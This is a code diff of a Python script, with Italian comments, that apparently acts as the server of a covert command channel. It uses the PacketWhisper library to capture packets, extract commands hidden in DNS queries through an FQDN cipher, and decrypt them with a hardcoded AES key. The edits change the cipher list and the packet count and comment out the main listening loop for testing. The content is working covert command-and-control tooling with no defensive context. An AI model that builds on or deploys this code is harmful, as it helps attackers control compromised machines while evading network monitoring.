@@ -8,7 +8,7 @@ from packetWhisper import ExtractCapturedPayload, ExtractDNSQueriesFromPCAP, Ext
 
 # Chiave AES (stessa chiave del client)
 key = b'TuaChiaveAES32byteQui__AESKeyExample'[:32]
-
+cipher = "ciphers\\common_fqdn\\topWebsites"
 
 def capture_pcap(filename, packet_count):
     packets = sniff(count=packet_count)
@@ -16,10 +16,10 @@ def capture_pcap(filename, packet_count):
 
 def receive_command():
     print("Capturing pcap...")
-    capture_pcap("cloaked_command.pcap", 1500)
+    capture_pcap("cloaked_command.pcap", 2000) #1500
     print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
-    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, "ciphers\\repeated_unique_fqdn\\red_lectroids", "www", isRandomized=True )
+    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
     cloaked_command = cloakedFile #"cloaked.payload"
     decloaked_command = "decloaked_command.txt"
@@ -31,7 +31,7 @@ def receive_command():
         
     # Decloakificare il comando
     print("Decloakifying...")
-    Decloakify(cloaked_command, "ciphers\\repeated_unique_fqdn\\red_lectroids", decloaked_command)
+    Decloakify(cloaked_command, cipher, decloaked_command)
 
     # Decrypt command
     with open(decloaked_command, 'r') as file:
@@ -74,5 +74,15 @@ def send_response(response):
 
 if __name__ == "__main__":
     print("Server in attesa di richieste...")
+    
+    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
+    print(dnsQueriesFilename)
+    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=False )
+    print(cloakedFile)
+    
+
+    '''
     while True:
         receive_command()
+    '''
+    
